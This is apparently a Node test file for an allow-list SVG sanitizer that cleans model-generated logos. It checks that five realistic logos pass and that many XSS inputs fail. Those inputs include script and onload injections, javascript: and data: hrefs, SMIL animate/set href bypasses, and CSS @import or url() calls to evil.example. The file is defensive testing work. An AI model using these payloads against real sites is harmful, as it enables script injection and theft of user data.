import assert from "node:assert";
import { sanitizeSvg } from "./svg.ts";

// Adversarial check for HAEBOT_A_TOOLS_SPEC.md Part 6 T6: "logo returns
// valid, sanitized, renderable SVG." Run with:
//   node lib/tools/svg.test.ts

// A clean, real logo SVG passes.
assert.equal(sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg"><circle r="10"/></svg>').ok, true);

// A same-document fragment reference (gradient/pattern target, <use>) is
// exactly what href is for and must still work.
assert.equal(
  sanitizeSvg('<svg><defs><circle id="c" r="5"/></defs><use href="#c"/></svg>').ok,
  true,
);

// Not SVG at all.
assert.equal(sanitizeSvg("not an svg at all").ok, false);

// The baseline adversarial cases — a "model output" trying to smuggle in
// an XSS payload must be rejected, not passed through to the browser.
assert.equal(sanitizeSvg("<svg><script>alert(1)</script></svg>").ok, false);
assert.equal(sanitizeSvg('<svg onload="alert(1)"><rect/></svg>').ok, false);
assert.equal(sanitizeSvg('<svg><a href="javascript:alert(1)">x</a></svg>').ok, false);
assert.equal(
  sanitizeSvg('<svg><foreignObject><body onload="x()"></body></foreignObject></svg>').ok,
  false,
);

// Known regex-sanitizer bypass payloads — these specifically target the
// gaps a block-list (matching literal "href=...javascript:", a fixed set
// of tag names) misses, which is why the sanitizer is allow-list based.

// SMIL <animate>/<set> retargeting an href at runtime never contains the
// literal string "javascript:" inside an href= attribute — the old
// regex sanitizer never looked at <animate>'s own attributes at all.
assert.equal(
  sanitizeSvg('<svg><use href="#x"><animate attributeName="href" to="javascript:alert(1)" begin="0s"/></use></svg>').ok,
  false,
);
assert.equal(
  sanitizeSvg('<svg><a><set attributeName="href" to="javascript:alert(1)"/></a></svg>').ok,
  false,
);
assert.equal(sanitizeSvg("<svg><animateTransform/></svg>").ok, false);
assert.equal(sanitizeSvg("<svg><animateMotion/></svg>").ok, false);

// <style> — CSS-based exfiltration (@import, background: url(...)) —
// the old sanitizer's block-list didn't mention this element at all.
assert.equal(sanitizeSvg("<svg><style>@import url(http://evil.example/x.css);</style></svg>").ok, false);
assert.equal(sanitizeSvg('<svg><g style="background:url(http://evil.example/x)"><rect/></g></svg>').ok, false);

// External/data: href on an otherwise-allowed element (href is only
// ever a same-document fragment reference).
assert.equal(sanitizeSvg('<svg><use href="http://evil.example/x.svg#y"/></svg>').ok, false);
assert.equal(sanitizeSvg('<svg><use xlink:href="javascript:alert(1)"/></svg>').ok, false);
assert.equal(sanitizeSvg('<svg><use href="data:image/svg+xml,%3Cscript%3E1%3C/script%3E"/></svg>').ok, false);

// Case obfuscation doesn't bypass the tag/attribute allow-list.
assert.equal(sanitizeSvg("<svg><SCRIPT>alert(1)</SCRIPT></svg>").ok, false);
assert.equal(sanitizeSvg('<svg><rect ONLOAD="alert(1)"/></svg>').ok, false);

// A disallowed element nested inside an otherwise-safe, allowed
// container (<defs>) is still rejected — every tag is checked, not just
// top-level children.
assert.equal(sanitizeSvg("<svg><defs><script>alert(1)</script></defs></svg>").ok, false);

// A literal '>' inside a quoted attribute value must not end the tag
// early and let a following unsafe attribute slip past unchecked.
assert.equal(sanitizeSvg('<svg><rect fill="a>b" onload="alert(1)"/></svg>').ok, false);

// An unrecognized-but-harmless attribute is stripped, not a reason to
// fail the whole SVG (real logos routinely use attributes the allow-list
// hasn't been extended to yet) — but the allowed content around it
// survives intact, and the dangerous attribute one tag over still fails.
{
  const result = sanitizeSvg('<svg><rect data-foo="bar" fill="red"/></svg>');
  assert.equal(result.ok, true);
  assert.ok(!result.svg!.includes("data-foo"));
  assert.ok(result.svg!.includes('fill="red"'));
}
assert.equal(sanitizeSvg('<svg><rect data-foo="bar" onload="alert(1)"/></svg>').ok, false);

// Five realistic logo SVGs (gradients, nested <g>, clip-path/mask,
// multi-line <text>/<tspan> with dx/dy and a style attribute, <use> +
// <symbol> icon reuse) — the shapes an actual model-generated logo uses,
// not just adversarial payloads. All five must pass unmodified in
// substance (only truly unrecognized attributes may be stripped).
const realisticLogos = [
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60">
     <defs>
       <linearGradient id="g1" x1="0" y1="0" x2="1" y2="0">
         <stop offset="0%" stop-color="#6c5ce7"/>
         <stop offset="100%" stop-color="#00cec9"/>
       </linearGradient>
     </defs>
     <text x="10" y="40" font-family="Pretendard, sans-serif" font-size="32" font-weight="700" fill="url(#g1)">해봇</text>
   </svg>`,
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
     <defs>
       <radialGradient id="r1" cx="50%" cy="50%" r="50%">
         <stop offset="0%" stop-color="#fff" stop-opacity="0.9"/>
         <stop offset="100%" stop-color="#0984e3"/>
       </radialGradient>
     </defs>
     <g transform="translate(50,50) rotate(15)">
       <circle r="40" fill="url(#r1)"/>
       <g opacity="0.85">
         <path d="M-20,-20 L20,-20 L0,20 Z" fill="#2d3436" stroke="#000" stroke-width="1.5"/>
       </g>
     </g>
   </svg>`,
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
     <defs>
       <clipPath id="c1"><rect x="0" y="0" width="64" height="64" rx="12"/></clipPath>
       <pattern id="p1" width="8" height="8" patternUnits="userSpaceOnUse">
         <rect width="8" height="8" fill="#f5f6fa"/>
         <circle cx="4" cy="4" r="1.5" fill="#dfe6e9"/>
       </pattern>
     </defs>
     <g clip-path="url(#c1)">
       <rect width="64" height="64" fill="url(#p1)"/>
       <circle cx="32" cy="32" r="20" fill="#e17055"/>
     </g>
   </svg>`,
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220 80">
     <text x="10" y="30" font-family="'Noto Sans KR', sans-serif" font-size="20" letter-spacing="1" style="fill:#2d3436;font-weight:600">
       <tspan x="10" dy="0">스튜디오</tspan>
       <tspan x="10" dy="28" font-size="12" fill="#636e72">Creative Studio</tspan>
     </text>
   </svg>`,
  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40">
     <defs>
       <symbol id="star" viewBox="0 0 24 24">
         <path d="M12 2l3 7h7l-5.5 4.5L18 21l-6-4-6 4 1.5-7.5L2 9h7z" fill="#fdcb6e"/>
       </symbol>
     </defs>
     <use href="#star" x="0" y="8" width="24" height="24"/>
     <use href="#star" x="30" y="8" width="24" height="24"/>
     <text x="64" y="26" font-family="sans-serif" font-size="18" fill="#2d3436">Studio</text>
   </svg>`,
];
for (const [i, svg] of realisticLogos.entries()) {
  const result = sanitizeSvg(svg);
  assert.equal(result.ok, true, `realistic logo #${i + 1} should pass: ${result.reason ?? ""}`);
}

console.log("svg sanitizer: all checks passed");
